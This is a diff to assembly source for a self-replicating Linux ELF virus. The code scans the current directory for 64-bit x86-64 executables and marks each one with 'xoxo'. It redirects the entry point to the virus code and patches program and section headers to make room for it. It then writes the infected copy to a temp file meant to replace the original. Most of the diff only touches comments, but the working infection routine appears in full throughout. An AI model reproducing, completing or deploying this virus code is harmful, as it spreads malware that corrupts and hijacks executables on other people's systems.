@@ -120,7 +120,7 @@ BITS 64
 ;	struc filestat
 ;		.st_dev			resq	1	;IDofdevcontainingfile
 ;		.st_ino			resq	1	;inode#
-;		.st_mode		resd	1	;pn
+;		.st_mode		resd	1	;mode
 ;		.st_nlink		resd	1	;#ofhardlinks
 ;		.st_uid			resd	1	;useridofowner
 ;		.st_gid			resd	1	;groupIdofowner
@@ -141,7 +141,7 @@ BITS 64
 ;		.ei_data		resb	1		;
 ;		.ei_version		resb	1		;
 ;		.ei_osabi		resb	1		;
-;		.ei_abiversion		resb	1		;
+;		.ei_abiversion	resb	1		;
 ;		.ei_padding		resb	6		;bytes9-14
 ;		.ei_nident		resb	1		;sizeofidentarray
 ;		.e_type			resw	1		;uint16_t,bytes16-17
@@ -152,9 +152,9 @@ BITS 64
 ;		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
 ;		.e_flags		resd	1		;uint32_t, bytes 48-51
 ;		.e_ehsize		resb	2		;uint16_t, bytes 52-53
-;		.e_phentsize		resb	2		;uint16_t, bytes 54-55
+;		.e_phentsize	resb	2		;uint16_t, bytes 54-55
 ;		.e_phnum		resb	2		;uint16_t, bytes 56-57
-;		.e_shentsize		resb	2		;uint16_t, bytes 58-59
+;		.e_shentsize	resb	2		;uint16_t, bytes 58-59
 ;		.e_shnum		resb	2		;uint16_t, bytes 60-61
 ;		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 ;	endstruc
@@ -179,7 +179,7 @@ BITS 64
 ;     	.sh_size		resq 1		; uint64_t   
 ;     	.sh_link		resd 1		; uint32_t   
 ;     	.sh_info		resd 1		; uint32_t   
-;     	.sh_addralign		resq 1		; uint64_t   
+;     	.sh_addralign	resq 1		; uint64_t   
 ;     	.sh_entsize		resq 1		; uint64_t   
 ;	endstruc
 ;
@@ -189,11 +189,15 @@ BITS 64
 ; so, yw,  I've written out the stack layout 4 u
 ; il n'y a plus de cauchemars
 ; jtm xoxo
+;
+; Note that I use r14 here rather than rsp
+; This is because gospel begins by reserving 0x2000 bytes on the stack 
+; and then moving the saved value of [rsp - 0x2000] to r14
 ;*******************************************************************************
 ; r14 	 =	struc filestat
 ; r14 + 0			.st_dev			resq	1	;IDofdevcontainingfile
 ; r14 +	8			.st_ino			resq	1	;inode#
-; r14 + 16			.st_mode		resd	1	;pn
+; r14 + 16			.st_mode		resd	1	;mode
 ; r14 + 20			.st_nlink		resd	1	;#ofhardlinks
 ; r14 + 24			.st_uid			resd	1	;useridofowner
 ; r14 + 28			.st_gid			resd	1	;groupIdofowner
@@ -277,33 +281,33 @@ BITS 64
 ; the below offset listings assume that you are at the 0th PHdr
 ; obv adjust accordingly 
 
-; r14 + elf_ehdr.e_phoff + 0	struc elf_phdr
-; r14 + elf_ehdr.e_phoff + 0		.p_type			resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_phoff + 4		.p_flags		resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_phoff + 8		.p_offset		resq 1		;  Elf64_Off  
-; r14 + elf_ehdr.e_phoff + 16		.p_vaddr		resq 1		;  Elf64_Addr 
-; r14 + elf_ehdr.e_phoff + 24		.p_paddr		resq 1		;  Elf64_Addr 
-; r14 + elf_ehdr.e_phoff + 32		.p_filesz		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 40		.p_memsz		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 48		.p_align		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 56	endstruc
+;  r14 + 800 + elf_ehdr.e_phoff + 0	struc elf_phdr
+;  r14 + 800 + elf_ehdr.e_phoff + 0		.p_type			resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 4		.p_flags		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 8		.p_offset		resq 1		; Elf64_Off  
+;  r14 + 800 + elf_ehdr.e_phoff + 16	.p_vaddr		resq 1		; Elf64_Addr 
+;  r14 + 800 + elf_ehdr.e_phoff + 24	.p_paddr		resq 1		; Elf64_Addr 
+;  r14 + 800 + elf_ehdr.e_phoff + 32	.p_filesz		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 40	.p_memsz		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 48	.p_align		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 56	endstruc
 ;
 ;
 ; We can use the same breakdown of offsets for the ELF Section Headers:
 ;
-; r14 + elf_ehdr.e_shoff + 0	struc elf_shdr
-; r14 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_shoff + 4		.sh_type		resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_shoff + 8		.sh_flags		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_shoff + 16		.sh_addr		resq 1		;  Elf64_Addr 
-; r14 + elf_ehdr.e_shoff + 24		.sh_offset		resq 1		;  Elf64_Off  
-; r14 + elf_ehdr.e_shoff + 32		.sh_size		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_shoff + 40    	.sh_link		resd 1		; uint32_t   
-; r14 + elf_ehdr.e_shoff + 44		.sh_info		resd 1		; uint32_t   
-; r14 + elf_ehdr.e_shoff + 48		.sh_addralign	resq 1		; uint64_t   
-; r14 + elf_ehdr.e_shoff + 56		.sh_entsize		resq 1		; uint64_t   
-; r14 + elf_ehdr.e_shoff + 64	endstruc
-;****************************************************************************************
+;  r14 + 800 + elf_ehdr.e_shoff + 0	struc elf_shdr
+;  r14 + 800 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 4		.sh_type		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 8		.sh_flags		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 16	.sh_addr		resq 1		; Elf64_Addr 
+;  r14 + 800 + elf_ehdr.e_shoff + 24	.sh_offset		resq 1		; Elf64_Off  
+;  r14 + 800 + elf_ehdr.e_shoff + 32	.sh_size		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 40    .sh_link		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 44	.sh_info		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 48	.sh_addralign	resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 56	.sh_entsize		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 64	endstruc
+;*******************************************************************************
 ;section .data
 ;x64 syscall reference
 ;
@@ -323,7 +327,7 @@ BITS 64
 ;SYS_CREAT		equ 0x55
 ;
 ;PAGESIZE dd 4096	
-;****************************************************************************************
+;*******************************************************************************
 ;%define vlen equ vend - _start
 global _start
 default rel
@@ -343,14 +347,14 @@ vxstart:
 	sub rsp, 0x2000
 	mov r14, rsp
 	jmp get_cwd
-;****************************************************************************************
+;*******************************************************************************
 ; open - syscall 0x2
 ;;	open(filename, flags, mode);
 ;;	rdi == filename
 ;;	rsi == flags
 ;;	rdx == mode
 ;; 	returns: fd (in rax, obv)
-;****************************************************************************************
+;*******************************************************************************
 _getdirents:
 	pop rdi
 	xor rsi, rsi 		;no flags
@@ -363,40 +367,40 @@ _getdirents:
 get_cwd:
 	call _getdirents
 	targetdir: db ".",0
-;****************************************************************************************
+;*******************************************************************************
 ; getdents64 - syscall 0x4e
-;; getdents(unsigned int r14 + 416, struct linuxdirent *dirent, unsigned int count);
-;;	rdi == r14 + 416
+;;getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
+;;	rdi == fd
 ;;	rsi == *dirent
 ;;	rdx == count
 ;;	returns # entries in rax
 ;
-;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
-;so we can iterate through all dirent entries using the size field in this dirent struc
-;as an offset for successive jumps in address space	
-;****************************************************************************************
+; [r14 + 600 + dirent] holds the pointer to the first dirent struct
+; so we can iterate through all dirent entries using the size field in 
+; this dirent struc as an offset for successive jumps in address space	
+;*******************************************************************************
 process_dirents:
 	mov rdi, rax
-	lea rsi, [r14 + 600]	;r14 + 600 = location on stack where we'll save our dirent struct
-	mov rdx, 0x800	; MAX_RDENT_BUF_SIZE
-	mov rax, 0x4e	;SYS_GETDENTS64
+	lea rsi, [r14 + 600] ;r14 + 600 = location on stack for saved dirent struct
+	mov rdx, 0x800		; MAX_RDENT_BUF_SIZE
+	mov rax, 0x4e		;SYS_GETDENTS64
 	syscall
 
-	mov r8, rax 					;save # of dirent entries in r8
-	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
-;****************************************************************************************
+	mov r8, rax 				;save # of dirent entries in r8
+	mov qword [r14 + 500], rax	;also save # of dir entries to var on stack
+;*******************************************************************************
 ; close - syscall 0x3
-;;	close(r14 + 416);
-;;	rdi == r14 + 416 (file descriptor)
+;;	close(fd);
+;;	rdi == fd ;r14 + 416 (file descriptor)
 ;; 	returns: 0 on success (-1 on error)
-;****************************************************************************************
+;*******************************************************************************
 	mov rdi, r9
 	mov rax, 0x3 ;SYS_CLOSE
 	syscall
 	
 	xor rcx, rcx	
 	jmp check_file
-;****************************************************************************************
+;*******************************************************************************
 ;check_file:
 ;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
 ;	upon successful mmap, close file
@@ -413,7 +417,7 @@ process_dirents:
 ; since d_type field in the dirent struct might not be available, 
 ; use the macros for fstat instead for checking the validity of a candidate file 
 ; associated with each dirent entry
-;****************************************************************************************
+;*******************************************************************************
 check_file:
 	push rcx
 	check_elf:
@@ -473,38 +477,39 @@ check_file:
 		mov rax, 0x5 ;SYS_FSTAT
 		syscall
 
-	
+;*******************************************************************************
 		;void *mmap(void addr[.length], size_t length, int prot, int flags,
 		;                  int r14 + 416, off_t offset);
+;*******************************************************************************
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
-								; r14 + 416 is already in r8 so we don't need to set that reg again
+					; fd is already in r8 so we don't need to set that reg again
 		mov r10, 0x2			; MAP_PRIVATE
 		xor r9, r9				; offset of 0 within file == start of file, obv	
-		mov rax, 0x9 ;SYS_MMAP
+		mov rax, 0x9 			;SYS_MMAP
 		syscall
 		
 		cmp rax, 0
 		jb checknext
 		pop r9
 		mov r8, rax
-		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
+		mov [r14 + 800], rax	;rax contains address of mmap'd host ELF
 		push rax
 	close_curr_file:
 		mov rdi, r9
-		mov rax, 0x3 					;SYS_CLOSE
+		mov rax, 0x3 			;SYS_CLOSE
 		syscall
 	
 		pop rax
 		test rax, rax
 		js checknext
-;****************************************************************************************
+;*******************************************************************************
 ;ELF header vals
 ;ETYPE_DYN			equ 0x3
 ;ETYPE_EXEC			equ 0x2
-;****************************************************************************************
+;*******************************************************************************
 	check_elf_header_etype:
 		cmp word [rax + 16], 0x0002		;elf_ehdr.e_type
 		je check_elf_header_magic_bytes
@@ -515,17 +520,17 @@ check_file:
 	check_elf_header_magic_bytes:
 		cmp dword [rax], 0x464c457f		;elf_ehdr.e_ident
 		jnz checknext
-;****************************************************************************************
+;*******************************************************************************
 ;ELF header vals
 ;ELFCLASS64 		equ 0x2
-;****************************************************************************************
+;*******************************************************************************
 	check_elf_header_64bit:
 		cmp byte [rax + 4], 0x2
 		jne checknext
-;****************************************************************************************
+;*******************************************************************************
 ;ELF header vals
 ;ELFX8664			equ 0x3e
-;****************************************************************************************
+;*******************************************************************************
 	check_elf_header_arch:
 		cmp byte [rax + 18], 0x3e			;elf_ehdr.e_machine
 		jne checknext
@@ -586,99 +591,120 @@ payload:
 	mov rdi, 0x1 ;STDOUT
 	syscall
 	jmp _restore
-;****************************************************************************************
-;	Infection routine:
+;*******************************************************************************
+;	Text segment padding virus, infection routine:
+;       
+;	Assumes the following:
+;	vlen == length of virus code
+;	PAGESIZE == 4096
 ;
-;	assumes the following:
-; 	vlen == length of virus code
-;	PAGESIZE == 4096	
-;
-;	1. identify entry point of host program and patch virus code to jump back to original
-;	host entry point
-;	2. 	a. copy ELF header from host program to virus;
-;		b. change e_shoff in virus ELF header to new e_shoff s.t. 
-;			new_vx_e_shoff = host_e_shoff + PAGESIZE
-;	3. 	a. Loop through all Phdrs to find the text segment Phdr
-;		b. if curr_Phdr == text_segment_Phdr then, do the following:
-;			i. modify entry point of ELF header to point to the virus code
-;			ii. increase p_filesz by vlen [p_filesz += vlen] 
-;			iii. increase p_memsz by vlen, [p_memsz += vlen]
-;		c. Else, for all Phdrs corresponding to segments located after inserted virus code
-;			(aka for each Phdr of a segment after the text segment), then, do the following:
-;			i. increase p_offset by PAGESIZE
-;	4. Loop through all Shdrs
-;		a. If curr_shdr == last_shdr_text_segment then,
-;			i. increase sh_len by vlen [sh_len += vlen]
-;		b. Else, for all Shdrs corresponding to sections located after inserted virus code
-;			(aka for each Shdr of a section after virus code), then, do the following:
-;			i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
-;	5. Insert the virus code into the host program 
-;		(or, in our case, into the tempfile we are constructing to replace host program)
-;
-;****************************************************************************************
+;   1. Find and save original entry point (OEP) of ELF host 
+;   2. Patch ELF header values to account for newly inserted virus code
+;		a. Patch e_entry in the ELF header to point to beginning of virus code
+;      	b. change e_shoff in virus ELF header to new_vx_e_shoff 
+;			s.t. new_vx_e_shoff = host_e_shoff + PAGESIZE
+;   3. a. Loop through all Phdrs to find text segment Phdr
+;      b. if curr_Phdr == text_segment_Phdr then, do the following:
+;           i. increase p_filesz by vlen [p_filesz += vlen] 
+;           ii. increase p_memsz by vlen, [p_memsz += vlen]
+;      c. Else, for all Phdrs corresponding to segments located after inserted
+;		   virus code (aka for each Phdr of a segment after the text segment),
+;		   then, do the following:
+;           i. increase p_offset by PAGESIZE
+;   4. Loop through all Shdrs
+;      a. If curr_shdr == last_shdr_text_segment then,
+;           i. increase sh_len by vlen [sh_len += vlen]
+;      b. Else, for all Shdrs corresponding to sections located after inserted 
+;		  virus code (aka for each Shdr of a section after virus code), 
+;		  then, do the following:
+;           i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
+;   5. Insert the virus code into the host program 
+;		a. In our case, insert the virus code into the tempfile we are 
+;			constructing to replace host ELF
+;		b. Add routine to end of virus code so that execution continues with
+;			 jump back to saved OEP
+;*******************************************************************************
 
 infect:
-	mov r13, [r14 + 800]	;location on stack for saved address returned from mmap syscall
-	mov r12, [r13 + 32]					;offset of host ELF Program Header Table in r12
-	mov r15, [r13 + 40] 				;offset of host ELF Section Header Table in r15
-	mov r8, [r13 + 24] 					;offset of host ELF entry point in r8
+	mov r13, [r14 + 800]	;location on stack for saved address of 
+							;mmap'd host ELF returned from mmap syscall
+	mov r12, [r13 + 32]		;offset of host ELF Program Header Table in r12
+	mov r15, [r13 + 40] 	;offset of host ELF Section Header Table in r15
+	mov r8, [r13 + 24] 		;offset of host ELF entry point in r8
 
-	mov dword [r13 + 9], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
+	mov dword [r13 + 9], 0x786f786f		
+	;infection marker string "xoxo" in elf_ehdr.e_padding
 	
-;****************************************************************************************
-;	Update program headers of infected ELF
+;*******************************************************************************
+;Patch Program Headers of infected ELF
 ;
-;	e_phentsize == size of program header entry	
-;	size of program header table == e_phnum * e_phentsize
-;	vx_offset = the offset to start of vx code after insertion into host program 
-;	vx_offset will replace e_entry in ELF header as the new entry point in infected ELF
-;	r13 contains address of mmap'ed file
-;	r12 contains *offset* within mmap'ed file to PHdr
-;	we need to increment r12 on each iteration (where # of iterations == elf_ehdr.e_phnum)
-;	also need to save original host file entry point for jmp in vx code
+;e_phentsize == size of program header entry	
+;size of program header table == e_phnum * e_phentsize
+;vx_offset = the offset to start of vx code after insertion into host 
+;vx_offset will replace e_entry in ELF header, 
+;defining the entry point in the infected ELF
 ;
-; r14 + elf_ehdr.e_phoff + 0	struc elf_phdr
-; r14 + elf_ehdr.e_phoff + 0		.p_type			resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_phoff + 4		.p_flags		resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_phoff + 8		.p_offset		resq 1		;  Elf64_Off  
-; r14 + elf_ehdr.e_phoff + 16		.p_vaddr		resq 1		;  Elf64_Addr 
-; r14 + elf_ehdr.e_phoff + 24		.p_paddr		resq 1		;  Elf64_Addr 
-; r14 + elf_ehdr.e_phoff + 32		.p_filesz		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 40		.p_memsz		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 48		.p_align		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_phoff + 56	endstruc
+;r13 contains address of mmap'ed host ELF
+;mov r13, [r14 + 800]	
+;location on stack for saved address returned from mmap syscall
+;r12 contains *offset* within mmap'ed file to PHdr table
+;mov r12, [r13 + 32]	 ;offset of host ELF Program Header Table
+;we need to increment r12 on each iteration 
+;(where # of iterations == elf_ehdr.e_phnum)
+;
+;we also need to save original entry point of the host ELF for  
+;the final jmp at the end of our vx code
+;
+;We can use our schema from our stack layout for computing offsets 
+;to diff SHdr fields as we iterate through all SHdrs:
+;For reference, the PHdr patching routine accesses the fields in each entry 
+;of the PHdr table using the following schema:
+;[r14 + 800] + elf_ehdr.e_phoff + phdr_field_offset
+;We can simplify it thus:
+;
+; r13 + r12 + 0		struc elf_phdr
+; r13 + r12 + 0				.p_type		resd 1	;  uint32_t   
+; r13 + r12 + 4				.p_flags		resd 1	;  uint32_t   
+; r13 + r12 + 8				.p_offset		resq 1	;  Elf64_Off  
+; r13 + r12 + 16			.p_vaddr		resq 1	;  Elf64_Addr 
+; r13 + r12 + 24			.p_paddr		resq 1	;  Elf64_Addr 
+; r13 + r12 + 32			.p_filesz		resq 1	;  uint64_t   
+; r13 + r12 + 40			.p_memsz		resq 1	;  uint64_t   
+; r13 + r12 + 48			.p_align		resq 1	;  uint64_t   
+; r13 + r12 + 56		endstruc
 ;
 ;PT_LOAD 	equ 0x1
 ;PFLAGS_RX	equ 0x5
 ;PFLAGS_RW	equ 0x6
-;****************************************************************************************
+;*******************************************************************************
 	xor rcx, rcx
 	xor r11, r11
-	mov word cx, [r13 + 56]									;elf_ehdr.e_phnum
+	mov word cx, [r13 + 56]						;elf_ehdr.e_phnum
 	check_phdrs:
 		.phdr_loop:
 			push rcx
-			cmp word [r13 + r12], 0x1			;check elf_phdr.p_type offset for type PT_LOAD	
+			cmp word [r13 + r12], 0x1			;check elf_phdr.p_type == PT_LOAD	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				cmp dword [r13 + r12 + 4], 0x5	;elf_phdr.p_flags offset for PFLAG_R | PFLAG_X
+				cmp dword [r13 + r12 + 4], 0x5	;elf_phdr.p_flags == PFLAG_R | PFLAG_X
 				je .mod_phdr_text_segment			
 				jmp .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
-					mov r10, [r13 + r12 + 16] 	;entry virtual addr (r14 + 400) = phdr->p_vaddr + phdr->p_filesz
-					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
-					mov qword [r14 + 400], r10				;save r14 + 400
+					mov r10, [r13 + r12 + 16] 	;entry virtual addr (r14 + 400)
+												;evaddr= phdr->p_vaddr + phdr->p_filesz
+					add r10, [r13 + r12 + 32]	; elf_phdr.p_filesz offset
+					mov qword [r14 + 400], r10	; save evaddr to (r14 + 400)
 
-					mov r11, qword [r13 + 24]					; load address of original entry point from ELF header
-					mov qword [r14 + 448], r11			; save OEP to stack
-														; new entry point of infected file = r14 + 400 + ventry
-					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
-					mov r10, [r13 + r12 + 8]			; elf_phdr.p_offset  
-					add r10, [r13 + r12 + 32]			; elf_phdr.p_filesz offset
+					mov r11, qword [r13 + 24]	;load address of original entry point from ELF header
+					mov qword [r14 + 448], r11	;save OEP to stack
+												;new entry point of infected file = r14 + 400 + ventry
+					mov qword [r13 + 24], r10		; patch ELF header entry point to virus code start
+					mov r10, [r13 + r12 + 8]		; elf_phdr.p_offset  
+					add r10, [r13 + r12 + 32]		; elf_phdr.p_filesz offset
 					mov dword [r14 + 436], r10d
 					add qword [r13 + r12 + 32], vlen+12	;elf_phdr.p_filesz offset
 					add qword [r13 + r12 + 40], vlen+12	;elf_phdr.p_memsz offset
-					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
+					jmp .next_phdr						
 			.mod_subsequent_phdr:
 				xor r11, r11
 				mov r11d, [r14 + 436]
@@ -702,52 +728,71 @@ infect:
 			jg .phdr_loop
 	mov dword [r14 + 432], r12d
 
-;****************************************************************************************
-;	Now update section headers of infected ELF
+;*******************************************************************************
+;Now patch section headers of infected ELF:
+;We will use a very similar schema as was used in the PHdr patching routine 
+;above for our SHdr patching routine, with a few modifications.
 ;
-; r14 + elf_ehdr.e_shoff + 0	struc elf_shdr
-; r14 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_shoff + 4		.sh_type		resd 1		;  uint32_t   
-; r14 + elf_ehdr.e_shoff + 8		.sh_flags		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_shoff + 16		.sh_addr		resq 1		;  Elf64_Addr 
-; r14 + elf_ehdr.e_shoff + 24		.sh_offset		resq 1		;  Elf64_Off  
-; r14 + elf_ehdr.e_shoff + 32		.sh_size		resq 1		;  uint64_t   
-; r14 + elf_ehdr.e_shoff + 40    	.sh_link		resd 1		; uint32_t   
-; r14 + elf_ehdr.e_shoff + 44		.sh_info		resd 1		; uint32_t   
-; r14 + elf_ehdr.e_shoff + 48		.sh_addralign	resq 1		; uint64_t   
-; r14 + elf_ehdr.e_shoff + 56		.sh_entsize		resq 1		; uint64_t   
-; r14 + elf_ehdr.e_shoff + 64	endstruc
+;r13 contains address of mmap'ed host ELF
+;mov r13, [r14 + 800]	
+;location on stack for saved address returned from mmap syscall
 ;
-;****************************************************************************************
+;r15 contains *offset* within mmap'ed file to SHdr table
+;mov r15, [r13 + 40] ;offset of host ELF Section Header Table
+;
+;we need to increment r15 on each iteration 
+;(where # of iterations == elf_ehdr.e_shnum)
+;At the 0th iteration, r15 contains the offset of the 0th Section Header 
+;in the SHdr Table
+;
+;We can use our schema from our stack layout for computing offsets 
+;to diff SHdr fields as we iterate through all SHdrs:
+;[r14 + 800] + elf_ehdr.e_shoff + shdr_field_offset
+;And simplify it thus:
+;	r13 + r15 + 0		struc elf_shdr
+;	r13 + r15 + 0			.sh_name		resd 1		;  uint32_t   
+;	r13 + r15 + 4			.sh_type		resd 1		;  uint32_t   
+;	r13 + r15 + 8			.sh_flags		resq 1		;  uint64_t   
+;	r13 + r15 + 16			.sh_addr		resq 1		;  Elf64_Addr 
+;	r13 + r15 + 24			.sh_offset		resq 1		;  Elf64_Off  
+;	r13 + r15 + 32			.sh_size		resq 1		;  uint64_t   
+;	r13 + r15 + 40    		.sh_link		resd 1		; uint32_t   
+;	r13 + r15 + 44			.sh_info		resd 1		; uint32_t   
+;	r13 + r15 + 48			.sh_addralign	resq 1		; uint64_t   
+;	r13 + r15 + 56			.sh_entsize		resq 1		; uint64_t   
+;	r13 + r15 + 64	endstruc
+;
+;*******************************************************************************
 	xor r10, r10
 	xor r11, r11
 	xor rcx, rcx
-	mov word cx, [r13 + 60]											; elf_ehdr.e_shnum
+	mov word cx, [r13 + 60]							; elf_ehdr.e_shnum
 	check_shdrs:
 		.shdr_loop:
 			push rcx
-			mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
+			mov r11, [r13 + r15 + 24]				;elf_shdr.sh_offset
 			cmp dword r11d, [r14 + 436]
 			jge .mod_subsequent_shdr
 			jl .check_for_last_text_shdr
 			.check_for_last_text_shdr:
-				mov r11, [r13 + r15 + 16]						;elf_shdr.sh_addr
-				add r11, qword [r13 + r15 + 32]					;elf_shdr.sh_size
+				mov r11, [r13 + r15 + 16]			;elf_shdr.sh_addr
+				add r11, qword [r13 + r15 + 32]		;elf_shdr.sh_size
 				cmp r11, qword [r14 + 400]
 				jne .next_shdr
 			.mod_last_text_section_shdr:
-				mov r10, [r13 + r15 + 32]						;elf_shdr.sh_size
+				mov r10, [r13 + r15 + 32]			;elf_shdr.sh_size
 				add dword r10d, vlen
-				mov [r13 + r15 + 32], r10						;elf_shdr.sh_size
+				mov [r13 + r15 + 32], r10			;elf_shdr.sh_size
 				jmp .next_shdr
 			.mod_subsequent_shdr:
-				mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
+				mov r11, [r13 + r15 + 24]			;elf_shdr.sh_offset
 				add dword r11d, [PAGESIZE]
-				mov dword [r13 + r15 + 24], r11d					;elf_shdr.sh_offset
+				mov dword [r13 + r15 + 24], r11d	;elf_shdr.sh_offset
 		.next_shdr:
 			pop rcx
 			dec cx 
-			add r15w, word [r13 + 58] 				; add elf_ehdr.e_shentsize to shdr offset in r15 
+			add r15w, word [r13 + 58] 			;add elf_ehdr.e_shentsize 
+												;to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
 	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
@@ -760,7 +805,7 @@ infect:
 		mov dword [r14 + 440], r11d
 		jmp frankenstein_elf
 
-;****************************************************************************************
+;*******************************************************************************
 ;	From silvio's article [1], we know that an infected ELF will have 
 ;	the following layout:
 ;
@@ -798,7 +843,7 @@ infect:
 ;	close temp file
 ;	unmap file from memory
 ;
-;****************************************************************************************
+;*******************************************************************************
 
 frankenstein_elf:
 	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
@@ -900,50 +945,50 @@ frankenstein_elf:
 		;;previous version with shifts
 		;mov dword [vxdatasegment], r10d
 		;;shr r10d, 12						;divide file offset size by PAGESIZE
-		;mov dword [num_pages], r10d			;to calculate the number of pages to pad the file		
+		;mov dword [num_pages], r10d		;to calculate the number of pages to pad the file		
 		;;xor rax, rax
 		;;mov eax, dword [PAGESIZE]
 		;;imul r10d
 		;shl r11d, 1
 		;;add eax, dword [PAGESIZE] 
 		;;add eax, r11d 
-		mov rsi, qword [r14 + 424]				;offset of next segment after .text segment in host ELF
+		mov rsi, qword [r14 + 424]		;offset of next segment after .text in host ELF
 		add esi, r11d 
 		;;mov dword [r14 + 444], eax
-		mov dword [r14 + 444], esi				;vx_padding_size (# of bytes of padding after vx)
+		mov dword [r14 + 444], esi		;vx_padding_size (# padding bytes after vx)
 ;		mov esi, eax
 		mov rax, 0x4d ;SYS_FTRUNCATE
 		syscall
 
 	.write_remainingsegments_totemp:
 		xor r10, r10
-		mov rdx, qword [r14 + 408]				; original shoff
-		sub edx, dword [r14 + 424]				; offset of next segment after .text segment in host ELF
-		lea rsi, [r13]							;r13 contains pointer to mmap'd file
-		add rsi, qword [r14 + 424]				;adjust rsi address to point to PT_LOAD segment 
-												;following .text segment in mmap'd original host file
-		mov r10d, dword [r14 + 444]				;vx_padding_size (# of bytes of padding after vx)
-		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
+		mov rdx, qword [r14 + 408]		; original shoff
+		sub edx, dword [r14 + 424]		; offset of next segment after .text in host ELF
+		lea rsi, [r13]					;r13 contains pointer to mmap'd file
+		add rsi, qword [r14 + 424]		;adjust rsi address to point to PT_LOAD segment 
+										;following .text segment in mmap'd original host file
+		mov r10d, dword [r14 + 444]		;vx_padding_size (# of bytes of padding after vx)
+		mov rax, 0x12					;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.write_patched_shdrs_totemp:
-		mov rdx, [r14 + 48] 					;filestat.st_size
-		sub rdx, qword [r14 + 408]				; original shoff
+		mov rdx, [r14 + 48] 			;filestat.st_size
+		sub rdx, qword [r14 + 408]		;original shoff
 		lea rsi, [r13]
-		add rsi, qword [r14 + 408]				; original shoff			
-		mov r10d, dword [r14 + 440]				;vx SH offset
-		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
+		add rsi, qword [r14 + 408]		;original shoff			
+		mov r10d, dword [r14 + 440]		;vx SH offset
+		mov rax, 0x12					;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.munmap_file_work_area:
-		lea rdi, [r13]							;munmap file from work area
-		mov rsi, [r14 + 48] 					;filestat.st_size
-		mov rax, 0xB 							;SYS_MUNMAP
+		lea rdi, [r13]					;munmap file from work area
+		mov rsi, [r14 + 48] 			;filestat.st_size
+		mov rax, 0xB 					;SYS_MUNMAP
 		syscall
 
 	.close_temp:		
-		mov rdi, r9								;close temp file
-		mov rax, 0x3 							;SYS_CLOSE
+		mov rdi, r9						;close temp file
+		mov rax, 0x3 					;SYS_CLOSE
 		syscall
 fin_infect:
 	ret
